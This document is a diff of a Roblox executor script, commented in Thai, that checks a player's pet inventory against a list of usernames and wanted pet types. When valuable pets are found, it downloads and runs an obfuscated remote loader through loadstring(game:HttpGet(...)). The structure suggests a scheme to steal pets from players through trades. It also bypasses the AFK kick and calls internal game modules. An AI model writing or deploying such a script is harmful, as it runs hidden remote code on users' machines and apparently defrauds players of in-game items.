@@ -1,37 +1,42 @@
 if not game:IsLoaded() then
-    repeat
-        game.Loaded:Wait()
-    until game:IsLoaded()
+    repeat game.Loaded:Wait() until game:IsLoaded()
 end
 
-repeat wait() until game.Players
-repeat wait() until game.Players.LocalPlayer
+repeat task.wait() until game.Players
+repeat task.wait() until game.Players.LocalPlayer
 
+-- ตรวจสอบการโหลดข้อมูล
 local VirtualInputManager = game:GetService("VirtualInputManager")
-repeat task.wait()
+repeat
     VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
     VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+    task.wait(0.5)
 until game.Players.LocalPlayer:GetAttribute("DataFullyLoaded")
 
+-- ป้องกัน AFK
 game:GetService("Players").LocalPlayer.Idled:Connect(function()
-    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
     task.wait(1)
-    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
 end)
 
+-- ฟังก์ชันตรวจสอบ宠物 (แก้ไขแล้ว)
 local function hasTargetPet()
+    local player = game.Players.LocalPlayer
     local success, result = pcall(function()
-        local player = game.Players.LocalPlayer
-        setthreadidentity(2)
-        local ActivePetsService = require(game:GetService("ReplicatedStorage").Modules.ReplicationClass).new("ActivePetsService_Replicator")
-        setthreadidentity(8)
-        local allData = ActivePetsService:YieldUntilData().Table.PlayerPetData[player.Name]["PetInventory"]["Data"]
+        -- โหลดข้อมูล宠物
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        if not ReplicatedStorage:FindFirstChild("Modules") then return false end
+        
+        local ReplicationClass = require(ReplicatedStorage.Modules.ReplicationClass)
+        local ActivePetsService = ReplicationClass.new("ActivePetsService_Replicator")
+        local petData = ActivePetsService:YieldUntilData().Table.PlayerPetData[player.Name]["PetInventory"]["Data"]
 
-        -- Check all target configs
+        -- ตรวจสอบกับ TargetConfigs
         for username, config in pairs(_G.TradeManage.TargetConfigs) do
-            for _, petType in pairs(config.wantedPets) do
-                for uuid, pet in pairs(allData) do
-                    if pet.PetType == petType then
+            for _, targetPet in ipairs(config.wantedPets) do
+                for uuid, pet in pairs(petData) do
+                    if pet.PetType == targetPet then
                         return true
                     end
                 end
@@ -40,52 +45,31 @@ local function hasTargetPet()
         return false
     end)
 
-    return success and result
+    if not success then
+        warn("[Error] Check pets failed:", result)
+        return false
+    end
+    return result
 end
 
-getgenv().YourScript = function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/0xztnes/testsc/refs/heads/main/Loading"))()
-end
-
+-- คีย์และการกำหนดค่า
 getgenv().KEY = "NASACOMPUTER888"
 _G.TradeManage = {
     TargetConfigs = {
-        ["KingSentz645770"] = {
-            wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"}
-        },
-        ["OrvilleuMoEfH"] = {
-            wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"} 
-        },
-        ["SafiyaAlShafee72"] = {
-            wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly"}
-        },
-        ["NoahXShop"] = {
-            wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly"}
-        },
-        ["Ayoshipship"] = {
-            wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"}
-        },
-        ["zaq12wsx4z"] = {
-            wantedPets = {"Red Fox", "Brontosaurus"} 
-        },
-        ["19111993k"] = {
-            wantedPets = {"Spaghetti Sloth"}
-        },
-        ["Taylor117k"] = {
-            wantedPets = {"Capybara"}
-        },
-        ["oreosandmilk2q"] = {
-            wantedPets = {"Capybara"}
-        },
-        ["Minecraft_1u"] = {
-            wantedPets = {"Capybara"} 
-	},
-	["nachan279"] = {
-            wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly", "French Fry Ferret", "Spaghetti Sloth", "Mochi Mouse", "Capybara"} 
-        }
+        ["KingSentz645770"] = { wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"} },
+        ["OrvilleuMoEfH"] = { wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"} },
+        ["SafiyaAlShafee72"] = { wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly"} },
+        ["NoahXShop"] = { wantedPets = {"Mimic Octopus", "Dragonfly", "Disco Bee", "Butterfly"} },
+        ["Ayoshipship"] = { wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"} },
+        ["zaq12wsx4z"] = { wantedPets = {"Red Fox", "Brontosaurus"} },
+        ["19111993k"] = { wantedPets = {"Spaghetti Sloth"} },
+        ["Taylor117k"] = { wantedPets = {"Capybara"} },
+        ["oreosandmilk2q"] = { wantedPets = {"Capybara"} },
+        ["Minecraft_1u"] = { wantedPets = {"Capybara"} }
     }
 }
 
+-- โหลดสคริปต์หลัก
 if hasTargetPet() then
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
 else
